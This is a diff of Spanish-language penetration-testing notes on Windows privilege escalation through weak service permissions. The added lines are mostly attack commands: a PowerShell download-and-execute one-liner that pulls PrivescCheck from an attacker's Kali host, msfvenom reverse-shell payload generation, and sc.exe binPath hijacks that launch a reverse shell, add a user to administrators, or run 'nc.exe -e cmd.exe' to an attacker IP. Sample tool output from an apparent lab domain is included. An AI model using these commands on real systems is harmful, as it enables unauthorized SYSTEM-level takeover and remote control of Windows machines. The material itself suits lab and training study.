@@ -10,10 +10,12 @@ Privilege Escalation (Privesc) — proceso de elevar privilegios desde un acceso
 * [PrivescCheck](https://github.com/itm4n/PrivescCheck)
 
 ```bash 
-❯ powershell -c "(New-Object Net.WebClient).DownloadFile('http://IP_Kali/PrivescCheck.ps1','PrivescCheck.ps1')"
+# Cargar en memoria  <- MEJOR OPCIÓN  
+❯ powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://<IP_KALI>/PrivescCheck.ps1');Invoke-PrivescCheck > PrivescCheck.log 
 
-# Ejecutar en la máquina víctima Windows 
-❯ powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"    
+# Cargar en disco 
+❯ powershell -c "(New-Object Net.WebClient).DownloadFile('http://IP_Kali/PrivescCheck.ps1','PrivescCheck.ps1')"
+❯ powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"   # Ejecutar en la máquina víctima Windows   
 ```
 
 ## PrivEsc - Services Permissions 
@@ -81,7 +83,7 @@ NOTA:
 Forma 3: Desde Kali 
 Paso 1:
 # Crear el ejecutable malicioso y compartirlo 
-❯ msfvenom -p windows/shell_reverse_tcp -a x64 --platform windows LHOST=eth0 LPORT=445 -f exe > shell.exe
+❯ msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows LHOST=eth0 LPORT=445 -f exe > shell.exe
 
 Paso 2:
 # Modificar el binpath 
@@ -94,4 +96,73 @@ Paso 3:
 Paso 4:
 # Ejecutar la shell desde /Temp 
 ❯ sc.exe start <service>
+```
+
+## PrivEsc - 
+
+```powershell 
+# El usuario kanon puede modificar la configuración del servicio wuauserv (Windows Update) que corre como LocalSystem — eso es privesc directo.
+
+????????????????????????????????????????????????????????????????
+? CATEGORY ? TA0004 - Privilege Escalation                     ?
+? NAME     ? Services - Permissions                            ?
+? TYPE     ? Base                                              ?
+????????????????????????????????????????????????????????????????
+? Check whether the current user has any write permissions on  ?
+? a service through the Service Control Manager (SCM).         ?
+????????????????????????????????????????????????????????????????
+
+Name              : WebAPIService = <service>
+DisplayName       : Web API Service
+User              : LocalSystem
+ImagePath         : C:\Services\WebAPI\webapi-svc.exe
+StartMode         : Manual
+Type              : Win32OwnProcess
+RegistryKey       : HKLM\SYSTEM\CurrentControlSet\Services
+RegistryPath      : HKLM\SYSTEM\CurrentControlSet\Services\WebAPIService
+Status            : Stopped
+UserCanStart      : False
+UserCanStop       : False
+IdentityReference : HACK-ACADEMY\svc_webapi (S-1-5-21-1006770658-2633334449-451426994-1103)
+Permissions       : AllAccess
+```
+
+```powershell 
+# Forma 1 
+
+Paso 1:
+# Crear el ejecutable malicioso y compartirlo desde Kali
+❯ msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows LHOST=eth0 LPORT=443 -f exe > shell.exe
+
+Paso 2:
+# Reemplazar el binario dentro de la máquina Windows vulnerable e iniciar 
+❯ sc.exe config WebAPIService binPath= "C:\Temp\shell.exe"
+❯ sc.exe query WebAPIService
+❯ sc.exe qc WebAPIService     # Verificar el cambio
+
+Paso 3:
+# Ponerse en escucha en Kali 
+❯ nc -lvnp 443
+
+Paso 4:
+# Iniciar el servicio 
+❯ sc.exe start WebAPIService
+```
+
+```powershell 
+# Forma 2 
+
+# agregr a un usuario al grupo administrators 
+❯ sc.exe config WebAPIService binPath= "cmd.exe /c net localgroup administrators svc_webapi /add"
+❯ sc.exe start WebAPIService
+```
+
+```powershell 
+# Forma 3 
+
+# Revershell directa con Netcat 
+❯ sc.exe config WebAPIService binPath= "C:\Temp\nc.exe TU_IP 4446 -e cmd.exe"
+❯ sc.exe start WebAPIService
+
+❯ nc -lvnp 4445
 ```
